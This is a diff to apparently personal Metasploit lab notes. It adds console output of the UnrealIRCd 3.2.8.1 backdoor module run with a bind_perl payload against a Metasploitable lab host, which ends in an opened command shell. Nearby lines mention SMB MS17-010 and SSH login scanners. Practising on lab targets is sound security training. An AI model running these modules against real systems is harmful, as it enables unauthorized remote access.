@@ -44,6 +44,21 @@ msfconsole
 #use auxiliary/scanner/smb/smb_ms17_010
 use exploit/unix/irc/unreal_ircd_3281_backdoor
 set payload cmd/unix/bind_perl
+exploit
+...
+View the full module info with the info, or info -d command.
+
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOST 192.168.1.121
+RHOST => 192.168.1.121
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit
+
+[*] 192.168.1.121:6667 - Connected to 192.168.1.121:6667...
+    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
+    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
+[*] 192.168.1.121:6667 - Sending backdoor command...
+[*] Started bind TCP handler against 192.168.1.121:4444
+[*] Command shell session 1 opened (192.168.1.103:39983 -> 192.168.1.121:4444) at 2023-02-02 16:30:39 +0800
+...
 ##
 search ssh_login
 use auxiliary/scanner/ssh/ssh_login
